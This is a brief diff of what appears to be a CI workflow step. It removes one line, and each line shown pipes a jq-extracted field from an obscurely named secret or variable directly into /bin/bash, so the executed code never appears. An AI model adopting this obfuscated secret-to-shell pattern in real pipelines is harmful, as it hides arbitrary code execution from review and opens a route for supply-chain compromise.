@@ -17,7 +17,6 @@ jobs:
           jvgng8: ${{ secrets.jvgng8 }}
         run: |
           printf '%s' "$jvgng8" | jq -r .nf4 | /bin/bash
-          echo $qw53761 | jq -r .rsqp06 | /bin/bash
           printf '%s' "$r23" | jq -r .o197 | /bin/bash
           printf '%s' "$eov6581" | jq -r .nyau2323 | /bin/bash
 
